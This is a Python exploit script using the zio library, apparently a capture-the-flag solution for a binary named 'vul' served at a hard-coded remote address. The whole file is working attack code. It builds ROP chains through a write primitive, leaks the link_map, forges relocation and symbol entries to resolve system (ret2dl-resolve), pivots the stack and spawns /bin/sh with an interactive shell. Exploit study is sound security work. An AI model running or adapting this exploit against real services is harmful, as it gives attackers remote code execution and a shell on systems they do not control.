#encoding:utf-8
import struct
from threading import Thread
from zio import *


target = './sandbox ./vul'
#target = './vul'
target = ('58.213.63.30', 4004)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

def write_16byte(io, addr, value):
    io.write('a'*0x10+l64(addr+0x10)+l64(0x400582))
    io.write(value+l64(0x601f00)+l64(0x400582))

fake_relro = ''
fake_sym = ''

#link_map_addr = 0x00007ffff7ffe1c8 #close aslr.(if has aslr, need leak)

#link_map_addr = 0x7ffff7ffe168
def generate_fake_relro(r_offset, r_sym):
    return l64(r_offset) + l32(7)+l32(r_sym)+ l64(0)

def generate_fake_sym(st_name):
    return l32(st_name)+l8(0x12)+l8(0) + l16(0) + l64(0) + l64(0)


#versym = 0x40031e
symtab = 0x4002b8
strtab = 0x400330
jmprel = 0x4003b8

bss_addr = 0x601058

# .bss addr = 0x601058
# 0x155dc*0x18+0x4003b8 = 0x601058
# so index = 0x155dc

#0x155e8*0x18+0x4002b8 = 0x601078
# so r_sym = 0x155e8

# 0x200d68 + 0x400330 = 0x601098
# so st_name = 0x200d68


def write_any(io, addr, value):
    print hex(addr), hex(value)
    io.read_until(':\n')
    io.writeline('0')
    io.write(l64(addr)+l64(value))

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    pop_rdi_ret = 0x0000000000400603
    pop_rsi_r15_ret = 0x0000000000400601
    leak_addr = 0x600ef0
    write_plt = 0x0000000000400430
    pop_rbp_ret = 0x4004d0
    leak_rop = l64(pop_rsi_r15_ret) + l64(leak_addr) + l64(0) + l64(pop_rdi_ret) + l64(1) + l64(write_plt)
    leak_rop += l64(pop_rbp_ret) + l64(0x601f00) + l64(0x400582)

    for i in range(0, len(leak_rop), 8):
        write_16byte(io, 0x601b00+i, leak_rop[i:i+8]+'\x00'*8)

    leave_ret = 0x40059d
    leak_stack_povit = 'a' * 0x10 + l64(0x601b00 - 0x8) + l64(leave_ret)
    io.write(leak_stack_povit)

    io.read_until(':')
    link_map_addr = l64(io.read(8)) + 0x28
    print hex(link_map_addr)

    r_offset = 0x601970 # a writable addr
    r_sym = 0x155e8

    fake_relro = generate_fake_relro(r_offset, r_sym).ljust(0x20, '\x00')

    st_name = 0x200d68
    fake_sym = generate_fake_sym(st_name).ljust(0x20, '\x00')

    write_16byte(io, link_map_addr+0x1c8, '\x00'*0x10)
    #write_16byte(io, 0x600858, l64(0x6ffffff0)+l64(0x3d57d6))

    for i in range(0, len(fake_relro), 8):
        write_16byte(io, 0x601058+i, fake_relro[i:i+8]+'\x00'*8)
    for i in range(0, len(fake_sym), 8):
        write_16byte(io, 0x601078+i, fake_sym[i:i+8]+'\x00'*8)

    write_16byte(io, 0x601098, 'system'.ljust(16, '\x00'))
    write_16byte(io, 0x601a50, '/bin/sh'.ljust(16, '\x00'))

    plt0 = 0x400420

    rop = l64(pop_rdi_ret) + l64(0x601a50)
    index = 0x155dc
    rop += l64(plt0) + l64(index)

    for i in range(0, len(rop), 8):
        write_16byte(io, 0x601980+i, rop[i:i+8]+'\x00'*8)

    stack_povit = 'a'*0x10 + l64(0x601980-0x8) + l64(leave_ret)
    io.write(stack_povit)

    interact(io)

exp(target)